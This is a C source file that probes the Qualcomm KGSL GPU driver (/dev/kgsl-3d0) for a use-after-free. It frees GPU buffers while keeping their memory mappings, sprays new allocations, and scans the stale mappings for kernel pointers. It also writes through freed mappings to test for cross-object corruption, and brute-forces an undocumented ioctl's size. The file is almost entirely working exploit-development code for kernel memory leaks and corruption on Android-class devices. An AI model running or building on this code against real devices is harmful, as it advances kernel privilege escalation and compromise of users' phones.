/*
 * kgsl_mmap_v3.c — KGSL mmap-after-free with volatile byte access
 *
 * Fix: GPU memory requires volatile single-byte access (no memset/memcpy).
 * memset triggers SIGBUS due to GPU cache coherency / write-combining.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o kgsl_mmap_v3 kgsl_mmap_v3.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <stdint.h>

#define KGSL_IOC_TYPE 0x09
#define MAKE_IOCTL_RW(nr, sz) (0xC0000000 | ((sz) << 16) | (KGSL_IOC_TYPE << 8) | (nr))

/* Confirmed working ioctl commands from v2 testing */
#define CMD_ALLOC   MAKE_IOCTL_RW(0x34, 48)
#define CMD_FREE    MAKE_IOCTL_RW(0x35, 8)

static int kgsl_fd = -1;
static sigjmp_buf jmp;
static volatile int caught_sig = 0;

static void sighandler(int sig) {
    caught_sig = sig;
    siglongjmp(jmp, sig);
}

static void install_sigs(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sighandler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
}

/* Safe GPU memory fill — volatile byte-by-byte, no memset */
static int safe_fill(volatile unsigned char *p, size_t len, unsigned char val) {
    if (sigsetjmp(jmp, 1) != 0) {
        install_sigs();
        return -1;  /* crashed */
    }
    for (size_t i = 0; i < len; i++)
        p[i] = val;
    return 0;
}

/* Safe GPU memory scan — returns first byte that differs from expected, or -1 */
static int safe_scan(volatile unsigned char *p, size_t len, unsigned char expected,
                     int *out_changed_count) {
    int first_diff = -1;
    int changes = 0;
    if (sigsetjmp(jmp, 1) != 0) {
        install_sigs();
        return -2;  /* crashed */
    }
    for (size_t i = 0; i < len; i++) {
        if (p[i] != expected) {
            changes++;
            if (first_diff < 0) first_diff = (int)i;
        }
    }
    if (out_changed_count) *out_changed_count = changes;
    return first_diff;
}

/* Safe hex dump of GPU memory */
static void safe_hexdump(volatile unsigned char *p, size_t offset, size_t count) {
    if (sigsetjmp(jmp, 1) != 0) {
        printf("(crash during hexdump)\n");
        install_sigs();
        return;
    }
    for (size_t i = 0; i < count; i++) {
        printf("%02x ", p[offset + i]);
        if ((i + 1) % 16 == 0) printf("\n  ");
    }
    printf("\n");
}

/* Safe 8-byte read from GPU memory */
static int safe_read8(volatile unsigned char *p, size_t offset, uint64_t *out) {
    if (sigsetjmp(jmp, 1) != 0) {
        install_sigs();
        return -1;
    }
    /* Read byte-by-byte to avoid alignment issues */
    unsigned char buf[8];
    for (int i = 0; i < 8; i++)
        buf[i] = p[offset + i];
    memcpy(out, buf, 8);
    return 0;
}

static int gpu_alloc(unsigned int size_bytes, unsigned int *out_id,
                     unsigned long *out_gpuaddr, size_t *out_mmapsize) {
    unsigned char buf[48] = {0};
    *(size_t *)(buf + 8) = size_bytes;
    int ret = ioctl(kgsl_fd, CMD_ALLOC, buf);
    if (ret < 0) return -1;
    if (out_id) *out_id = *(unsigned int *)(buf + 0);
    if (out_gpuaddr) *out_gpuaddr = *(unsigned long *)(buf + 24);
    if (out_mmapsize) *out_mmapsize = *(size_t *)(buf + 16);
    return 0;
}

static int gpu_free(unsigned int id) {
    unsigned char buf[8] = {0};
    *(unsigned int *)buf = id;
    return ioctl(kgsl_fd, CMD_FREE, buf);
}

static void *gpu_mmap(unsigned int id, size_t mmapsize) {
    size_t mapsz = mmapsize ? mmapsize : 8192;
    void *map = mmap(NULL, mapsz, PROT_READ | PROT_WRITE, MAP_SHARED,
                     kgsl_fd, (off_t)id * 4096);
    return map;
}

/*========== TEST 1: mmap-after-free with byte access ==========*/
static void test_mmap_after_free(void) {
    printf("\n=== TEST 1: mmap-after-free (volatile byte access) ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        install_sigs();

        unsigned int id;
        unsigned long gpuaddr;
        size_t mmapsize;

        if (gpu_alloc(4096, &id, &gpuaddr, &mmapsize) < 0) {
            printf("  alloc failed: %s\n", strerror(errno));
            _exit(1);
        }

        void *map = gpu_mmap(id, mmapsize);
        if (map == MAP_FAILED) {
            printf("  mmap failed: %s\n", strerror(errno));
            gpu_free(id);
            _exit(1);
        }
        size_t mapsz = mmapsize ? mmapsize : 8192;
        printf("  id=%u gpuaddr=0x%lx mmap=%p size=%zu\n", id, gpuaddr, map, mapsz);

        /* Fill with 0xAA using volatile byte writes */
        volatile unsigned char *p = (volatile unsigned char *)map;
        if (safe_fill(p, mapsz, 0xAA) < 0) {
            printf("  CRASH filling memory\n");
            _exit(2);
        }
        printf("  filled with 0xAA\n");

        /* Verify fill */
        int changes = 0;
        int diff = safe_scan(p, mapsz, 0xAA, &changes);
        if (diff == -2) {
            printf("  CRASH verifying fill\n");
            _exit(2);
        }
        printf("  verify: %s\n", diff < 0 ? "all 0xAA" : "MISMATCH!");

        /* FREE the GPU buffer — keep the mmap */
        int ret = gpu_free(id);
        printf("  freed id=%u: %s\n", id, ret == 0 ? "OK" : strerror(errno));

        /* Read stale mapping */
        diff = safe_scan(p, mapsz, 0xAA, &changes);
        if (diff == -2) {
            printf("  CRASH reading post-free — mapping invalidated\n");
        } else if (diff >= 0) {
            printf("  >>> DATA CHANGED at byte %d! %d bytes differ <<<\n", diff, changes);
            printf("  dump:\n  ");
            safe_hexdump(p, diff > 16 ? diff - 16 : 0, 96);

            /* Look for kernel pointers */
            for (size_t i = 0; i < mapsz - 7; i += 8) {
                uint64_t v;
                if (safe_read8(p, i, &v) == 0) {
                    if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL ||
                        (v & 0xFFFFFF0000000000ULL) == 0xffffff8000000000ULL) {
                        printf("  >>> KERNEL PTR +%zu: 0x%016llx <<<\n", i, (unsigned long long)v);
                    }
                }
            }
        } else {
            printf("  post-free: data still 0xAA (mapping alive but unchanged)\n");
        }

        /* Spray new allocations */
        printf("  spraying 256 new buffers...\n");
        unsigned int spray_ids[256];
        int sprayed = 0;
        for (int i = 0; i < 256; i++) {
            unsigned long ga;
            size_t ms;
            if (gpu_alloc(4096, &spray_ids[i], &ga, &ms) == 0) sprayed++;
            else break;
        }
        printf("  sprayed %d\n", sprayed);

        /* Check stale mapping again */
        diff = safe_scan(p, mapsz, 0xAA, &changes);
        if (diff == -2) {
            printf("  CRASH after spray — pages reclaimed!\n");
        } else if (diff >= 0) {
            printf("  >>> STALE MAPPING CHANGED AFTER SPRAY! %d bytes differ <<<\n", changes);
            printf("  dump:\n  ");
            safe_hexdump(p, diff > 16 ? diff - 16 : 0, 96);

            for (size_t i = 0; i < mapsz - 7; i += 8) {
                uint64_t v;
                if (safe_read8(p, i, &v) == 0) {
                    if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL) {
                        printf("  >>> KERNEL PTR +%zu: 0x%016llx <<<\n", i, (unsigned long long)v);
                    }
                }
            }

            /* Try writing through stale mapping */
            if (sigsetjmp(jmp, 1) == 0) {
                p[0] = 0xBB;
                printf("  stale write: readback=0x%02x (%s)\n",
                       p[0], p[0] == 0xBB ? "WRITE-THROUGH!" : "write failed");
            } else {
                printf("  stale write crashed (sig=%d)\n", caught_sig);
                install_sigs();
            }

            for (int i = 0; i < sprayed; i++) gpu_free(spray_ids[i]);
            munmap(map, mapsz);
            _exit(42);
        } else {
            printf("  stale mapping unchanged after spray\n");
        }

        for (int i = 0; i < sprayed; i++) gpu_free(spray_ids[i]);
        munmap(map, mapsz);
        _exit(0);
    }

    alarm(20);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);
    if (WIFEXITED(status))
        printf("  result: %s (exit=%d)\n",
               WEXITSTATUS(status) == 42 ? "UAF DETECTED!" :
               WEXITSTATUS(status) == 0 ? "no UAF" : "error",
               WEXITSTATUS(status));
    else if (WIFSIGNALED(status))
        printf("  child signal %d\n", WTERMSIG(status));
}

/*========== TEST 2: Multiple sizes mmap-after-free ==========*/
static void test_multi_size_uaf(void) {
    printf("\n=== TEST 2: mmap-after-free across sizes ===\n");

    unsigned int sizes[] = { 4096, 8192, 16384, 65536 };

    for (int s = 0; s < 4; s++) {
        pid_t pid = fork();
        if (pid < 0) continue;

        if (pid == 0) {
            install_sigs();

            unsigned int id;
            unsigned long gpuaddr;
            size_t mmapsize;

            if (gpu_alloc(sizes[s], &id, &gpuaddr, &mmapsize) < 0) _exit(1);

            void *map = gpu_mmap(id, mmapsize);
            if (map == MAP_FAILED) { gpu_free(id); _exit(1); }

            size_t mapsz = mmapsize ? mmapsize : sizes[s];
            volatile unsigned char *p = (volatile unsigned char *)map;

            /* Fill, free, check */
            if (safe_fill(p, mapsz, 0xCC) < 0) _exit(2);
            gpu_free(id);

            int changes;
            int diff = safe_scan(p, mapsz, 0xCC, &changes);
            if (diff == -2) {
                printf("  %5u bytes: CRASH post-free\n", sizes[s]);
            } else if (diff >= 0) {
                printf("  %5u bytes: >>> CHANGED! %d bytes at offset %d <<<\n",
                       sizes[s], changes, diff);
                _exit(42);
            } else {
                printf("  %5u bytes: data intact post-free\n", sizes[s]);
            }

            /* Spray */
            unsigned int spray_ids[128];
            int sprayed = 0;
            for (int i = 0; i < 128; i++) {
                unsigned long ga; size_t ms;
                if (gpu_alloc(sizes[s], &spray_ids[i], &ga, &ms) == 0) sprayed++;
                else break;
            }

            diff = safe_scan(p, mapsz, 0xCC, &changes);
            if (diff == -2) {
                printf("  %5u bytes: CRASH post-spray (%d sprayed)\n", sizes[s], sprayed);
            } else if (diff >= 0) {
                printf("  %5u bytes: >>> CHANGED AFTER SPRAY! %d bytes <<<\n",
                       sizes[s], changes);
                printf("  dump:\n  ");
                safe_hexdump(p, diff > 16 ? diff - 16 : 0, 64);
                for (int i = 0; i < sprayed; i++) gpu_free(spray_ids[i]);
                munmap(map, mapsz);
                _exit(42);
            } else {
                printf("  %5u bytes: unchanged after %d-buffer spray\n", sizes[s], sprayed);
            }

            for (int i = 0; i < sprayed; i++) gpu_free(spray_ids[i]);
            munmap(map, mapsz);
            _exit(0);
        }

        alarm(15);
        int status;
        waitpid(pid, &status, 0);
        alarm(0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 42)
            printf("  >>> UAF at %u bytes! <<<\n", sizes[s]);
    }
}

/*========== TEST 3: Rapid free+realloc race ==========*/
static void test_free_realloc_race(void) {
    printf("\n=== TEST 3: Free+realloc race (50 rounds) ===\n");

    int hits = 0;
    for (int round = 0; round < 50; round++) {
        pid_t pid = fork();
        if (pid < 0) continue;

        if (pid == 0) {
            install_sigs();

            unsigned int id;
            unsigned long ga;
            size_t ms;
            if (gpu_alloc(4096, &id, &ga, &ms) < 0) _exit(1);

            void *map = gpu_mmap(id, ms);
            if (map == MAP_FAILED) { gpu_free(id); _exit(1); }

            size_t mapsz = ms ? ms : 8192;
            volatile unsigned char *p = (volatile unsigned char *)map;

            /* Fill with marker */
            if (safe_fill(p, mapsz, 0xDD) < 0) _exit(2);

            /* Free AND immediately reallocate same size */
            gpu_free(id);

            /* Immediate realloc — might get same pages */
            unsigned int new_id;
            unsigned long new_ga;
            size_t new_ms;
            gpu_alloc(4096, &new_id, &new_ga, &new_ms);

            /* Check stale mapping */
            int changes;
            int diff = safe_scan(p, mapsz, 0xDD, &changes);
            if (diff >= 0) {
                /* Data changed! */
                munmap(map, mapsz);
                gpu_free(new_id);
                _exit(42);
            } else if (diff == -2) {
                _exit(3);  /* crash */
            }

            munmap(map, mapsz);
            gpu_free(new_id);
            _exit(0);
        }

        alarm(5);
        int status;
        waitpid(pid, &status, 0);
        alarm(0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 42) hits++;
    }
    printf("  result: %d/50 rounds showed data changes\n", hits);
    if (hits > 0) printf("  >>> UAF CONFIRMED in %d rounds! <<<\n", hits);
}

/*========== TEST 4: Probe GET_INFO ioctl size ==========*/
static void test_getinfo_probe(void) {
    printf("\n=== TEST 4: GET_INFO ioctl size probe ===\n");

    unsigned int id;
    unsigned long ga;
    size_t ms;
    if (gpu_alloc(4096, &id, &ga, &ms) < 0) {
        printf("  alloc failed\n");
        return;
    }
    printf("  test buffer: id=%u\n", id);

    for (int size = 8; size <= 64; size += 4) {
        unsigned char buf[128] = {0};
        /* Try id at different offsets — kernel struct layout unknown */
        /* Attempt 1: id at offset 8 (our current assumption) */
        *(unsigned int *)(buf + 8) = id;

        unsigned long cmd = MAKE_IOCTL_RW(0x36, size);
        errno = 0;
        int ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            printf("  >>> SIZE %d WORKS! cmd=0x%08lx\n", size, cmd);
            printf("  raw bytes: ");
            for (int i = 0; i < size && i < 48; i++) printf("%02x ", buf[i]);
            printf("\n");

            /* Try to interpret: gpuaddr at 0, size at some offset */
            unsigned long v0 = *(unsigned long *)(buf + 0);
            unsigned int v8 = *(unsigned int *)(buf + 8);
            unsigned int v12 = *(unsigned int *)(buf + 12);
            printf("  offset 0 (ulong): 0x%lx\n", v0);
            printf("  offset 8 (uint):  %u\n", v8);
            printf("  offset 12 (uint): 0x%x\n", v12);
            if (size >= 24) {
                size_t v16 = *(size_t *)(buf + 16);
                printf("  offset 16 (size_t): %zu\n", v16);
            }
        } else if (errno != ENOTTY) {
            printf("  size %d: ret=%d errno=%d (%s)\n", size, ret, errno, strerror(errno));
        }

        /* Attempt 2: id at offset 0 */
        memset(buf, 0, sizeof(buf));
        *(unsigned int *)(buf + 0) = id;
        ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            printf("  >>> SIZE %d WORKS (id@0)! cmd=0x%08lx\n", size, cmd);
            printf("  raw bytes: ");
            for (int i = 0; i < size && i < 48; i++) printf("%02x ", buf[i]);
            printf("\n");
        }
    }

    gpu_free(id);
}

/*========== TEST 5: Write-through-stale-mapping verification ==========*/
static void test_write_through(void) {
    printf("\n=== TEST 5: Write-through stale mapping ===\n");

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        install_sigs();

        /* Alloc two buffers */
        unsigned int id1, id2;
        unsigned long ga1, ga2;
        size_t ms1, ms2;

        if (gpu_alloc(4096, &id1, &ga1, &ms1) < 0) _exit(1);
        if (gpu_alloc(4096, &id2, &ga2, &ms2) < 0) { gpu_free(id1); _exit(1); }

        void *map1 = gpu_mmap(id1, ms1);
        void *map2 = gpu_mmap(id2, ms2);

        if (map1 == MAP_FAILED || map2 == MAP_FAILED) {
            printf("  mmap failed\n");
            _exit(1);
        }

        size_t sz1 = ms1 ? ms1 : 8192;
        size_t sz2 = ms2 ? ms2 : 8192;
        volatile unsigned char *p1 = (volatile unsigned char *)map1;
        volatile unsigned char *p2 = (volatile unsigned char *)map2;

        /* Fill buf1 with 0xAA, buf2 with 0xBB */
        safe_fill(p1, sz1, 0xAA);
        safe_fill(p2, sz2, 0xBB);

        printf("  buf1 id=%u: 0xAA, buf2 id=%u: 0xBB\n", id1, id2);

        /* Free buf1, keep mapping */
        gpu_free(id1);
        printf("  freed buf1\n");

        /* Write 0xEE through stale mapping of buf1 */
        if (sigsetjmp(jmp, 1) == 0) {
            p1[0] = 0xEE;
            p1[1] = 0xEE;
            p1[2] = 0xEE;
            p1[3] = 0xEE;
            printf("  wrote 0xEE to stale buf1 mapping\n");
            printf("  readback: %02x %02x %02x %02x\n", p1[0], p1[1], p1[2], p1[3]);
        } else {
            printf("  stale write crashed (sig=%d)\n", caught_sig);
            install_sigs();
        }

        /* Check if buf2 was affected (cross-object corruption) */
        int changes;
        int diff = safe_scan(p2, sz2, 0xBB, &changes);
        if (diff >= 0) {
            printf("  >>> BUF2 CORRUPTED! %d bytes changed starting at %d <<<\n", changes, diff);
            printf("  >>> THIS IS CROSS-OBJECT WRITE! <<<\n");
            safe_hexdump(p2, 0, 32);
            munmap(map1, sz1);
            munmap(map2, sz2);
            gpu_free(id2);
            _exit(42);
        } else {
            printf("  buf2 intact\n");
        }

        munmap(map1, sz1);
        munmap(map2, sz2);
        gpu_free(id2);
        _exit(0);
    }

    alarm(10);
    int status;
    waitpid(pid, &status, 0);
    alarm(0);
    if (WIFEXITED(status))
        printf("  result: %s\n",
               WEXITSTATUS(status) == 42 ? "CROSS-OBJECT WRITE!" : "no corruption");
    else if (WIFSIGNALED(status))
        printf("  child signal %d\n", WTERMSIG(status));
}

int main(void) {
    printf("=== KGSL MMAP V3 — Volatile byte access UAF ===\n");
    printf("uid=%u\n", getuid());

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        printf("KGSL open failed: %s\n", strerror(errno));
        return 1;
    }
    printf("KGSL fd=%d\n", kgsl_fd);
    install_sigs();

    /* Quick sanity */
    unsigned int tid;
    unsigned long tga;
    size_t tms;
    if (gpu_alloc(4096, &tid, &tga, &tms) < 0) {
        printf("FATAL: alloc failed\n");
        return 1;
    }
    printf("alloc OK: id=%u, mmapsize=%zu\n", tid, tms);
    gpu_free(tid);

    test_mmap_after_free();
    test_multi_size_uaf();
    test_free_realloc_race();
    test_getinfo_probe();
    test_write_through();

    close(kgsl_fd);
    printf("\n=== ALL V3 TESTS COMPLETE ===\n");
    return 0;
}
